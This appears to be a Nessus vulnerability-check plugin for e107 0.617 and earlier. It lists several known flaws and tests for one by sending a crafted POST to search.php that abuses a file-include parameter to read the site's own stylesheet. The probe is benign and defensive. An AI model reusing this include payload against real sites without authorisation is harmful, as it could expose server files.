#
# (C) Tenable Network Security
#


if (description) {
  script_id(18222);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2005-2805");
  script_bugtraq_id(13572, 13573, 13576, 13577, 13974, 14301, 14495, 14508, 14699);

  name["english"] = "e107 <= 0.617 Multiple Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple flaws.

Description :

The version of e107 installed on the remote host contains a large
number vulnerabilities, including global variable updates, remote file
includes, directory traversal, information disclosure, cross-site
scripting, and SQL injection vulnerabilities. 

See also :

http://e107.org/e107_plugins/bugtracker2/bugtracker2.php?0.bug.558 (no long valid?)
http://www.securityfocus.com/archive/1/402469/30/0/threaded
http://www.milw0rm.com/id.php?id=1106
http://www.securityfocus.com/archive/1/407582

Solution : 

Upgrade to e107 7.0 when it becomes available.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in e107 <= 0.617";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("e107_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/e107"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # Identify a stylesheet for use in the exploit.
  pat = '<link rel="stylesheet" href="([^:]+/e107\\.css)"';
  matches = egrep(pattern:pat, string:res);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      file = eregmatch(pattern:pat, string:match);
      if (!isnull(file)) {
        file = file[1];

        # Try to exploit the file include vuln to read the stylesheet; yes
        # it's lame, but it does prove whether the vulnerability exists.
        postdata = string(
          "searchquery=aaa&",
          "search_info[0][sfile]=./", file, "&",
          "searchtype[0]=0",
          "searchtype[1]=0"
        );
        req = string(
          "POST ", dir, "/search.php HTTP/1.1\r\n",
          "Host: ", get_host_name(), "\r\n",
          "Content-Type: application/x-www-form-urlencoded\r\n",
          "Content-Length: ", strlen(postdata), "\r\n",
          "\r\n",
          postdata
        );
        res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
        if (res == NULL) exit(0);

        if ("e107 website system" >< res) {
          security_hole(port);
          exit(0);
        }
      }
    }
  }
}
